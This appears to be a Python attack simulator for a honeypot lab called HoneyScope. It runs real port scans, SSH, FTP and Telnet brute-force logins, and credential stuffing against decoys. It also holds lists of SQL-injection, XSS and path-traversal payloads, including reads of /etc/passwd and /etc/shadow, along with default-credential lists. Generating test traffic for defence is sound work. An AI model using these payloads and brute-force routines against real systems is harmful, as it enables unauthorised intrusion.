#!/usr/bin/env python3
"""Controlled attack simulator - performs REAL attacks against your honeypot.

Every scenario sends genuine network traffic (TCP connects, real SSH
handshakes, real HTTP requests) that the decoys genuinely capture. It targets
LOCALHOST ONLY by default; non-loopback targets require --i-own-this-network.

Each scenario can bind its outgoing connections to a distinct loopback source
address (127.0.0.2, 127.0.0.3, ...). These are real, routable local
addresses, so the dashboard shows several distinct attacker IPs - nothing is
spoofed or fabricated.

Scenarios:
    port-scan   silent connects across every sensor port
    ssh         repeated failed SSH logins (real paramiko handshakes)
    stuffing    HTTP credential-stuffing against the decoy login form
    web         SQL-injection / XSS / path-traversal / shell probes
    ftp         FTP USER/PASS attempts
    telnet      Telnet login attempts
    all         everything above (default)
"""

from __future__ import annotations

import argparse
import http.client
import ipaddress
import socket
import sys
import time
import urllib.parse
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

SCENARIOS = ("all", "port-scan", "ssh", "stuffing", "web", "ftp", "telnet")

SSH_CREDS = [
    ("root", "toor"), ("admin", "admin"), ("root", "password"),
    ("ubuntu", "ubuntu"), ("pi", "raspberry"), ("test", "123456"),
    ("oracle", "oracle123"), ("postgres", "postgres"),
]

STUFFING_PAIRS = [
    ("alice.wong", "Summer2023!"), ("bob.smith", "Summer2023!"),
    ("admin", "P@ssw0rd"), ("carol.danvers", "Welcome123"),
    ("dpatel", "India@123"), ("svc_backup", "Backup#2024"),
    ("hr.manager", "Company2023"), ("jdoe", "Qwerty123"),
]

SQLI_PATHS = [
    "/product.php?id=1' OR '1'='1' UNION SELECT null,password FROM users--",
    "/search?q=1'; DROP TABLE users;--",
    "/item?id=(SELECT SLEEP(5))",
]
XSS_PATHS = [
    '/search?q=<script>alert(document.cookie)</script>',
    "/comment?text=<img src=x onerror=alert(1)>",
]
TRAVERSAL_PATHS = [
    "/download?file=../../../../etc/passwd",
    "/static/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
]
SHELL_PROBES = ["/cmd.php", "/wso.php", "/phpmyadmin/", "/wp-login.php",
                "/.git/config"]
SCANNER_UA = "sqlmap/1.7.11#stable (http://sqlmap.org)"
NORMAL_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"


def guard_target(host: str, authorized: bool) -> None:
    try:
        resolved = socket.gethostbyname(host)
        addr = ipaddress.ip_address(resolved)
    except (socket.gaierror, ValueError):
        sys.exit(f"[!] Cannot resolve target '{host}'")
    if not (addr.is_loopback or addr.is_private) and not authorized:
        sys.exit(
            "[!] Target is NOT a local/private address.\n"
            "    This simulator only attacks your own lab.\n"
            "    If you truly own the target network, re-run with "
            "--i-own-this-network.")


# ------------------------------------------------------------------ sockets
def _connect(host: str, port: int, src: str | None = None,
             timeout: float = 3.0) -> socket.socket:
    """TCP connect, optionally bound to a specific local source address."""
    if src:
        try:
            return socket.create_connection((host, port), timeout=timeout,
                                            source_address=(src, 0))
        except OSError:
            pass  # source alias unavailable on this OS -> fall back
    return socket.create_connection((host, port), timeout=timeout)


def tcp_probe(host: str, port: int, src: str | None = None,
              timeout: float = 2.0) -> bool:
    try:
        with _connect(host, port, src, timeout):
            return True
    except OSError:
        return False


def _bindable(ip: str) -> bool:
    """True if this local address can be bound as an outbound source."""
    probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        probe.bind((ip, 0))
        return True
    except OSError:
        return False
    finally:
        probe.close()


def discover_sources() -> list[str]:
    """Return real local IPv4 addresses usable as distinct attacker identities.

    Non-loopback interface IPs come first (the dashboard labels them
    "Private network" - more realistic), then any loopback aliases the OS
    supports (127.0.0.2 ... on Linux/Docker). Nothing is fabricated: every
    returned address is genuinely bound and used as the connection source.
    """
    candidates: list[str] = []
    try:
        for info in socket.getaddrinfo(socket.gethostname(), None,
                                       socket.AF_INET):
            ip = info[4][0]
            if ip not in candidates and not ip.startswith("127."):
                candidates.append(ip)
    except socket.gaierror:
        pass
    for i in range(2, 8):
        candidates.append(f"127.0.0.{i}")

    working = [ip for ip in candidates if _bindable(ip)]
    if "127.0.0.1" not in working:
        working.append("127.0.0.1")          # always available fallback
    return working or ["127.0.0.1"]


def _prebound_socket(src: str | None) -> socket.socket:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if src:
        try:
            sock.bind((src, 0))
        except OSError:
            pass
    return sock


# ---------------------------------------------------------------- scenarios
def scenario_port_scan(host: str, ports: list[int], delay: float,
                       src: str | None = None) -> None:
    print(f"[*] Port scan simulation against {len(ports)} decoy ports"
          f" (from {src or 'default route'})...")
    for p in ports:
        open_ = tcp_probe(host, p, src=src)
        print(f"    :{p:<6} {'open (captured)' if open_ else 'no listener'}")
        time.sleep(delay)


def scenario_ssh(host: str, port: int, delay: float,
                 src: str | None = None) -> None:
    print(f"[*] SSH brute-force simulation ({len(SSH_CREDS)} attempts,"
          f" from {src or 'default route'})...")
    try:
        import paramiko
    except ImportError:
        print("    [!] paramiko not installed - falling back to banner grabs")
        for _ in range(len(SSH_CREDS)):
            sock = _connect(host, port, src)
            sock.settimeout(3)
            try:
                sock.sendall(b"SSH-2.0-Go-http-client_1.1\r\n")
                sock.recv(128)
            except OSError:
                pass
            sock.close()
            time.sleep(delay)
        return

    for user, pwd in SSH_CREDS:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            # a fully-CONNECTED socket (optionally bound to a source address)
            sock = _connect(host, port, src, timeout=6)
            client.connect(hostname=host, port=port, username=user,
                           password=pwd, allow_agent=False,
                           look_for_keys=False, timeout=5,
                           banner_timeout=10, auth_timeout=8, sock=sock)
            print(f"    {user}/{pwd} -> accepted?! (decoy shell mode)")
            client.close()
        except paramiko.AuthenticationException:
            print(f"    tried {user:<9}/{'*' * len(pwd):<12} -> rejected (logged)")
            time.sleep(delay)
        except Exception as exc:
            print(f"    {user}: connection issue: {exc}")
            break


# ------------------------------------------------------------- HTTP helpers
def _http_conn(host: str, port: int, src: str | None):
    return http.client.HTTPConnection(
        host, port, timeout=5,
        source_address=(src, 0) if src else None)


def _split_base(base: str) -> tuple[str, int]:
    parts = urllib.parse.urlsplit(base)
    return parts.hostname or "127.0.0.1", parts.port or 80


def http_get(base: str, path: str, ua: str = NORMAL_UA,
             src: str | None = None) -> None:
    host, port = _split_base(base)
    conn = _http_conn(host, port, src)
    try:
        conn.request("GET", path, headers={"User-Agent": ua})
        resp = conn.getresponse()
        resp.read()
    except (http.client.HTTPException, OSError):
        pass  # 401/404 responses are still recorded by the honeypot
    finally:
        conn.close()


def http_post_form(base: str, path: str, fields: dict,
                   ua: str = NORMAL_UA, src: str | None = None) -> None:
    host, port = _split_base(base)
    conn = _http_conn(host, port, src)
    try:
        body = urllib.parse.urlencode(fields)
        conn.request("POST", path, body=body,
                     headers={"User-Agent": ua,
                              "Content-Type":
                                  "application/x-www-form-urlencoded"})
        resp = conn.getresponse()
        resp.read()
    except (http.client.HTTPException, OSError):
        pass
    finally:
        conn.close()


def scenario_stuffing(host: str, port: int, delay: float,
                      src: str | None = None) -> None:
    base = f"http://{host}:{port}"
    print(f"[*] Credential-stuffing simulation against {base}/login"
          f" (from {src or 'default route'})...")
    for user, pwd in STUFFING_PAIRS:
        http_post_form(base, "/login", {"username": user, "password": pwd},
                       src=src)
        print(f"    stuffed {user:<14} / {pwd}")
        time.sleep(delay)


def scenario_web(host: str, port: int, delay: float,
                 src: str | None = None) -> None:
    base = f"http://{host}:{port}"
    print(f"[*] Web attack simulations against {base}"
          f" (from {src or 'default route'})...")
    print("    fetching decoy login page")
    http_get(base, "/", src=src)
    for p in SQLI_PATHS:
        quoted = urllib.parse.quote(p.split("?", 1)[1], safe="=&?")
        path = p.split("?", 1)[0] + "?" + quoted
        http_get(base, path, ua=SCANNER_UA, src=src)
        print(f"    SQLi      {path[:64]}")
        time.sleep(delay)
    for p in XSS_PATHS:
        quoted = urllib.parse.quote(p.split("?", 1)[1], safe="=&?<>=()")
        http_get(base, p.split("?", 1)[0] + "?" + quoted, src=src)
        print(f"    XSS       {p[:64]}")
        time.sleep(delay)
    for p in TRAVERSAL_PATHS:
        http_get(base, p, src=src)
        print(f"   Traversal {p[:56]}")
        time.sleep(delay)
    for p in SHELL_PROBES:
        http_get(base, p, ua="Mozilla/5.0 (compatible; Nmap Scripting Engine)",
                 src=src)
        print(f"    shell-probe {p}")
        time.sleep(delay)


def scenario_ftp(host: str, port: int, delay: float,
                 src: str | None = None) -> None:
    print(f"[*] FTP login simulation on :{port}"
          f" (from {src or 'default route'})...")
    for user, pwd in (("anonymous", "anon@example.com"), ("admin", "admin123")):
        try:
            with _connect(host, port, src, timeout=4) as sock:
                sock.settimeout(3)
                sock.recv(256)                      # banner
                sock.sendall(f"USER {user}\r\n".encode()); time.sleep(0.2)
                sock.recv(256)
                sock.sendall(f"PASS {pwd}\r\n".encode()); time.sleep(0.2)
                sock.recv(256)
                sock.sendall(b"QUIT\r\n")
            print(f"    tried {user}/{pwd} -> logged")
        except OSError as exc:
            print(f"    ! {exc}")
        time.sleep(delay)


def scenario_telnet(host: str, port: int, delay: float,
                    src: str | None = None) -> None:
    print(f"[*] Telnet login simulation on :{port}"
          f" (from {src or 'default route'})...")
    try:
        with _connect(host, port, src, timeout=4) as sock:
            sock.settimeout(3)
            sock.recv(512)                          # motd + login prompt
            sock.sendall(b"admin\r\n");             time.sleep(0.3)
            sock.recv(128)                          # password prompt
            sock.sendall(root_pw := b"Passw0rd!\r\n"); time.sleep(0.3)
            sock.recv(128)
            sock.sendall(b"\r\n")
            time.sleep(0.3)
        print(f"    tried admin/{root_pw.decode().strip()} -> logged")
    except OSError as exc:
        print(f"    ! {exc}")


# ---------------------------------------------------------------------- main
def main() -> int:
    ap = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1",
                    help="target honeypot host (default 127.0.0.1)")
    ap.add_argument("--ssh-port", type=int, default=2222)
    ap.add_argument("--http-port", type=int, default=8081)
    ap.add_argument("--ftp-port", type=int, default=2121)
    ap.add_argument("--telnet-port", type=int, default=2323)
    ap.add_argument("--sensor-ports", default="1433,3306,3389,5432,5900,"
                                             "6379,8000,8081,8443,9000,9200,27017",
                    help="comma-separated sensor ports to probe")
    ap.add_argument("--scenario", default="all", choices=SCENARIOS)
    ap.add_argument("--all", action="store_true", dest="run_all",
                    help="alias for --scenario all")
    ap.add_argument("--delay", type=float, default=0.25,
                    help="seconds between individual attempts")
    ap.add_argument("--source-ip", default=None,
                    help="bind outbound connections to this local address "
                         "(e.g. 127.0.0.2) so the dashboard sees a distinct "
                         "attacker identity")
    ap.add_argument("--i-own-this-network", action="store_true",
                    help="consent flag required for non-loopback targets")
    args = ap.parse_args()

    if getattr(args, "run_all", False):
        args.scenario = "all"
    guard_target(args.host, args.i_own_this_network)
    sensors = [int(p) for p in args.sensor_ports.split(",") if p.strip()]
    src = args.source_ip

    print("=" * 62)
    print(" HoneyScope controlled attack simulator (authorized lab use)")
    print("=" * 62)

    if args.scenario in ("all", "port-scan"):
        scenario_port_scan(args.host, sensors, args.delay, src)
    if args.scenario in ("all", "ssh"):
        scenario_ssh(args.host, args.ssh_port, args.delay, src)
    if args.scenario in ("all", "stuffing"):
        scenario_stuffing(args.host, args.http_port, args.delay, src)
    if args.scenario in ("all", "web"):
        scenario_web(args.host, args.http_port, args.delay, src)
    if args.scenario in ("all", "ftp"):
        scenario_ftp(args.host, args.ftp_port, args.delay, src)
    if args.scenario in ("all", "telnet"):
        scenario_telnet(args.host, args.telnet_port, args.delay, src)

    print("-" * 62)
    print("[+] Done. Open the dashboard -> Events to see every captured")
    print("    attempt, then generate a security report on the Report page.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
